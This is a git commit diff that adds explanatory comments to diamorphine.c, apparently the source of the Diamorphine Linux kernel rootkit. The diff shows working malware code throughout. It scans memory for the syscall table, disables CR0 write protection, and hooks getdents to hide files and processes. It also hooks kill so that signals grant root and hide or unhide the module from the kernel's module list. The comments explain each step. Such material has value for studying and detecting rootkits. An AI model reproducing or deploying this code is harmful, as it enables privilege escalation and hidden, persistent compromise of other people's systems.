07310cb908c62680411ca7790f4344564d0d9d71
feexd <9276791+feexd@users.noreply.github.com>
2020-05-14 19:41:24 -0300

    Comment the entire module with explanations.

--- diamorphine.c
+++ diamorphine.c
@@ -33,12 +33,19 @@ orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 
+// Dynamically search for the syscall table location in memory.
 unsigned long *
 get_syscall_table_bf(void)
 {
 	unsigned long *syscall_table;
 	unsigned long int i;
 
+    // Iterates over memory searching for the syscall table address. To find
+    // the table this uses some basic pattern matching and compares the
+    // contents of memory at i plus the offset __NR_close (close() syscall)
+    // would be with the contents of the actual close() syscall.
+    // The close() syscall is chosen instead of others because it has the same
+    // offset on x86 and x86_64 architectures.
 	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
 			i += sizeof(void *)) {
 		syscall_table = (unsigned long *)i;
@@ -49,6 +56,8 @@ get_syscall_table_bf(void)
 	return NULL;
 }
 
+// Search for a process with specified PID by iterating over the task_struct
+// list.
 struct task_struct *
 find_task(pid_t pid)
 {
@@ -74,6 +83,8 @@ is_invisible(pid_t pid)
 	return 0;
 }
 
+// Malicious implementation of getdents64(), syscall responsible for listing
+// subdirectories and files. This is used for hiding directories.
 asmlinkage int
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	unsigned int count)
@@ -95,26 +106,50 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	if (err)
 		goto out;
 
+// The current pointer refers to the user process currently executing. During
+// the execution of a system call, such as open or read, the current process is
+// the one that invoked the call. The pointer is defined in arch/x86/include/current.h:
+//
+// static __always_inline struct task_struct *get_current(void)
+// {
+//     return percpu_read_stable(current_task);
+// }
+// #define current get_current()
+//
+// In short, it's a task_struct for the process that called the syscall, which
+// is getdent() in this case. In turn task_struct is a massive struct[1] that
+// holds all sorts of info about a task including a list of all files it has open.
+// As such, d_inode is the inode struct from the file descriptor passed as parameter
+// to the syscall.
+// [1] https://elixir.bootlin.com/linux/v4.6/source/include/linux/sched.h#L1394
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
 #else
 	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 #endif
+    // This seem to check wether the inode is /proc. This is necessary
+    // to hide the /proc/$PID entries for our hidden PIDs.
 	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
 		/*&& MINOR(d_inode->i_rdev) == 1*/)
 		proc = 1;
 
+    // Iterates over all directories from real getdents().
 	while (off < ret) {
 		dir = (void *)kdirent + off;
+        // When not in /proc filesystem check if dir/file name starts with MAGIC_PREFIX.
+        // When in /proc filesystem check if the PID (like /proc/125) is marked as invisible.
 		if ((!proc &&
 		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
 		|| (proc &&
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+            // If dir is the first element of the dirent list, discard it.
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
 				continue;
 			}
+            // Otherwise increment the length of the previous record such that
+            // prev + prev->d_reclen = next.
 			prev->d_reclen += dir->d_reclen;
 		} else
 			prev = dir;
@@ -183,6 +218,8 @@ out:
 	return ret;
 }
 
+// Gives root to the current task. Inner working is pretty straight forward: simply
+// modify the task attributes.
 void
 give_root(void)
 {
@@ -192,6 +229,10 @@ give_root(void)
 		current->suid = current->sgid = 0;
 		current->fsuid = current->fsgid = 0;
 	#else
+        // Newer kernels use a cred struct to store permissions of a task.
+        // Moreover CONFIG_UIDGID_STRICT_TYPE_CHECKS makes the {uid,euid,suid,fsuid}
+        // structs, so assigning integers to those will result in a build
+        // failure (since integers can't be assigned to structs).
 		struct cred *newcreds;
 		newcreds = prepare_creds();
 		if (newcreds == NULL)
@@ -209,6 +250,8 @@ give_root(void)
 			newcreds->suid = newcreds->sgid = 0;
 			newcreds->fsuid = newcreds->fsgid = 0;
 		#endif
+        // Finally commit the modified credentials. Curiously commit_creds seem
+        // to call kdebug(), so this might get logged into the ringbuffer.
 		commit_creds(newcreds);
 	#endif
 }
@@ -229,6 +272,10 @@ tidy(void)
 
 static struct list_head *module_previous;
 static short module_hidden = 0;
+
+// This will unhide the module by adding the rootkit module (previously
+// assigned to module_previous) to linked list of modules that's maintained by
+// the kernel.
 void
 module_show(void)
 {
@@ -238,6 +285,8 @@ module_show(void)
 	module_hidden = 0;
 }
 
+// Much like the previous function this will remove the rootkit module
+// from the linked list of modules.
 void
 module_hide(void)
 {
@@ -248,6 +297,7 @@ module_hide(void)
 	module_hidden = 1;
 }
 
+// Malicious version of kill() syscall.
 asmlinkage int
 hacked_kill(pid_t pid, int sig)
 {
@@ -257,33 +307,48 @@ hacked_kill(pid_t pid, int sig)
 		case SIGINVIS:
 			if ((task = find_task(pid)) == NULL)
 				return -ESRCH;
+            // Set task flag to make it invisible. This flag is checked by the
+            // getdents() syscall when reading entries in /proc.
 			task->flags ^= PF_INVISIBLE;
 			break;
 		case SIGSUPER:
+            // Makes the task that called kill() root.
 			give_root();
 			break;
 		case SIGMODINVIS:
+            // Toggles the module visibility.
 			if (module_hidden) module_show();
 			else module_hide();
 			break;
 		default:
+            // Calls original kill().
 			return orig_kill(pid, sig);
 	}
 	return 0;
 }
 
+// This restores the Control Register 0 to its original value.
 static inline void
 protect_memory(void)
 {
 	write_cr0(cr0);
 }
 
+// This unsets a bit in the Control Register 0. This disables the CPU write
+// protection, making the module able to write to a read-only memory location
+// such as the syscall table.
+//
+// The CR0 register is a special register that is responsible for a controlling
+// the behaviour of the CPU. This register's contents cannot be accessed from
+// userland so the Kernel provides the functions read_cr0() and write_cr0()
+// that to read and write to it.
 static inline void
 unprotect_memory(void)
 {
 	write_cr0(cr0 & ~0x00010000);
 }
 
+// This is the function that gets called when the module is loaded.
 static int __init
 diamorphine_init(void)
 {
@@ -291,15 +356,19 @@ diamorphine_init(void)
 	if (!__sys_call_table)
 		return -1;
 
+    // Store original contents of CR0.
 	cr0 = read_cr0();
 
 	module_hide();
 	tidy();
 
+    // Save original syscalls
 	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
 	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
 
+    // Remove write protection from memory, modify syscall_table with malicious
+    // functions and adds write protection back.
 	unprotect_memory();
 	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
@@ -312,6 +381,7 @@ diamorphine_init(void)
 static void __exit
 diamorphine_cleanup(void)
 {
+    // Restore syscall table to original condition.
 	unprotect_memory();
 	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
